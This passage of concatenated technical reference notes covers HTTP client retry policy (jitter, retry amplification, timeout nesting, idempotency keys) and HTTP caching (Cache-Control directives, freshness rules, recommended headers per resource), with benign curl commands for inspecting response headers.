Delay | Range | Mean | |---|---|---|---| | none | d | d | d | | full | random(0, d) | 0 .. d | d/2 | | equal | d/2 + random(0, d/2) | d/2 .. d | 0.75 d | | decorrelated | min(cap, random(base, 3 x previous)) | base .. min(cap, base x 3^k) | simulated | Full jitter spreads load best and is the default recommendation. Equal jitter keeps a minimum wait. Decorrelated jitter adapts to the previous delay and works well for long-running clients. ## Worst-case duration of one call worst = attempts x per_try_timeout + sum of max delays, then cut at the deadline if one is set. Example: 3 tries x 1 s + 100 ms + 200 ms = 3.3 s. ## Expected tries With an independent failure probability p per try and n attempts: E[tries] = 1 + p + p^2 + ... + p^(n-1) p = 0.3, n = 3 -> 1.39. During a full outage p = 1 and E = n. ## Amplification across layers If layer A retries 3 times and calls B, which retries 3 times and calls C, which retries 4 times, one user request can become 3 x 3 x 4 = 36 calls to C during an outage. This is a retry storm: the retries keep the failing service overloaded, so it cannot recover. Rules of thumb: - Retry at one layer only, usually the one closest to the user or the one that owns the idempotency key. - Inner layers: attempts 1 or 2 with a short deadline. - Keep worst-case amplification at or below about 10. - Add a **retry budget**: retries may be at most 10-20% of requests over a sliding window; past that, fail fast. ## Timeout nesting Each layer's worst case must fit inside its caller's per-try timeout, minus a margin for network and work: inner_worst <= outer_per_try_timeout - margin Otherwise the caller abandons the try and retries while the inner layer is still working, which doubles load. Pass a deadline down the chain (for example a `grpc-timeout` or `X-Request-Deadline` header) and stop when it is used up. ## Retry-After For 429 and 503, servers may send `Retry-After: ` or an HTTP date. Wait at least that long (use max(Retry-After, computed backoff)), and give up if it is longer than the remaining deadline. FILE:references/retry-safety-guide.md # Retry Safety Guide ## What to retry | Outcome | Retry? | Notes | |---|---|---| | Connection refused / reset before the request was sent | Yes | Safe for any method | | Timeout after the request was sent | Only if idempotent or with an idempotency key | The server may have done the work | | 408 Request Timeout | Yes, with backoff | | | 429 Too Many Requests | Yes, after Retry-After | Never faster than the server asks | | 500 Internal Server Error | Sometimes | Only if the error is known to be transient | | 502 / 503 / 504 | Yes, with backoff and jitter | Honor Retry-After on 503 | | 400 / 401 / 403 / 404 / 405 / 410 / 422 | No | Same request fails the same way; fix the request, refresh auth once at most | | 409 Conflict | Usually no | Exception: an idempotency key that is still in progress, retry after a short wait | ## Idempotency - GET, HEAD, OPTIONS, PUT and DELETE are idempotent by HTTP semantics, if the server implements them correctly. - POST and PATCH are not. To retry them, send an **idempotency key** (a UUID per logical operation, e.g. `Idempotency-Key` header) that the server stores with the result for 24 hours or more. Generate the key once, before the first try, and reuse it for every retry. - Payments, emails, SMS, order creation and stock reservation must never be retried without a key. ## Client checklist 1. Per-try timeout set and shorter than the caller's. 2. Overall deadline set and passed down the chain. 3. Exponential backoff with a cap and full jitter. 4. attempts <= 3 at the edge, 1-2 inside. 5. Retry only on the table's "Yes" rows. 6. Idempotency key on every retried non-idempotent call. 7. Retry budget or circuit breaker so retries stop during an outage. 8. # Cache-Control Directives and Freshness Rules

## Response directives
| Directive | Meaning |
|---|---|
| max-age=N | Fresh for N seconds in any cache (browser and shared) |
| s-maxage=N | Overrides max-age for shared caches (CDN, proxy) only |
| no-cache | May be stored, but must be revalidated with the origin before every use |
| no-store | Must not be stored anywhere; overrides everything else |
| private | Only the browser may store it; CDNs and proxies must not |
| public | Shared caches may store it even if it would normally not be cacheable (for example with Authorization) |
| must-revalidate | Once stale, must not be served without a successful revalidation |
| proxy-revalidate | Same as must-revalidate, for shared caches only |
| immutable | Will never change while fresh; browsers skip revalidation on reload |
| stale-while-revalidate=N | May serve stale for N seconds while refreshing in the background |
| stale-if-error=N | May serve stale for N seconds if the origin returns 5xx or is unreachable |
| no-transform | Intermediaries must not modify the body (recompress images, etc.) |

Common mistakes: `no-cache` does NOT mean "do not cache" (that is `no-store`); `max-age` values must be whole seconds (`max-age=10m` is invalid and ignored); `Pragma: no-cache` only works on requests.

## Freshness lifetime (RFC 9111)
1. Shared cache: s-maxage, else max-age, else Expires - Date.
2. Browser: max-age, else Expires - Date.
3. Neither present and Last-Modified present: caches may use a heuristic, usually 10% of (Date - Last-Modified). A file last changed 80 days ago may be reused for 8 days with no check.
4. `private` sets the shared lifetime to 0. `no-store` sets both to 0.

## Validators and revalidation
- ETag (strong `"abc"` or weak `W/"abc"`) -> client sends If-None-Match.
- Last-Modified -> client sends If-Modified-Since.
- A match returns `304 Not Modified` with no body, which is cheap. Without a validator, every revalidation downloads the whole body.

## Vary
- `Vary: Accept-Encoding` is normal and safe.
- `Vary: Cookie`, `User-Agent` or `Referer` creates one cache entry per distinct value, which usually means no CDN hits.
- `Vary: *` means the response can never be reused.

## Status codes
Cacheable by default when fresh: 200, 203, 204, 206, 300, 301, 308, 404, 405, 410, 414, 501. Error responses (4xx/5xx) should have short or no caching, or a CDN may serve an outage page for hours. Use `stale-if-error` to serve the last good copy instead.

# Caching Strategy Playbook

## Recommended headers by resource
| Resource | Cache-Control | Notes |
|---|---|---|
| HTML pages, app shell | `no-cache` + ETag | Always fresh after deploys; 304s keep it cheap |
| Marketing HTML on a CDN | `public, max-age=0, s-maxage=300, stale-while-revalidate=60` | Purge the CDN on publish |
| JS/CSS with a content hash (`app.3f9a1c7b.js`) | `public, max-age=31536000, immutable` | New build = new URL |
| JS/CSS without a hash | `public, max-age=300, stale-while-revalidate=86400` | Or add hashing to the build |
| Images, user uploads with stable URLs | `public, max-age=86400, stale-while-revalidate=604800` | Version the URL when the image changes |
| Fonts (versioned URL) | `public, max-age=31536000, immutable` | Also send CORS headers |
| Public API data (prices, catalog) | `public, max-age=30, s-maxage=300, stale-if-error=600` | Keep TTLs short; purge on change |
| Personal API data (cart, profile) | `private, no-cache` + ETag | Never public |
| Secrets, banking, health records, one-time tokens | `no-store` | Also on the logout and account pages |
| Redirect 301 | `max-age=86400` at first | Browsers can cache a bare 301 forever |
| Errors 5xx | `no-store` or `max-age=0`, use stale-if-error on the good responses | |

## Deploy safety
1. Hash every built asset name, then cache it for a year.
2. Make HTML revalidate so it always points at the current hashes.
3. Keep old hashed assets online for at least one release so open tabs still work.
4. Never put `immutable` on a URL whose content can change.

## CDN notes
- Most CDNs ignore `private`/`no-store` only if misconfigured; check "respect origin headers".
- Many CDNs do not cache responses with Set-Cookie by default; some do if `public` is set. Strip Set-Cookie from static responses.
- Use a `Surrogate-Control` or CDN-Cache-Control header if the CDN supports it and you want a CDN TTL different from the browser TTL.
- Normalize the cache key (ignore tracking query strings like utm_*).

## How to collect headers
```
curl -sI https://example.com/ ; curl -sI -H 'Cookie: session=...' https://example.com/api/me
curl -s -o /dev/null -D - https://example.com/assets/app.js   # GET instead of HEAD
```
Some servers answer HEAD differently from GET; when in doubt use the GET form. In Chrome DevTools: Network tab, select a request, Headers, Response Headers (copy as text).

## Checking the result
- Reload twice in DevTools: hashed assets should show "(memory cache)" or "(disk cache)", HTML should show 304 or 200.
- CDN: look at its `Age`, `X-Cache` or `CF-Cache-Status` header (HIT / MISS / BYPASS).
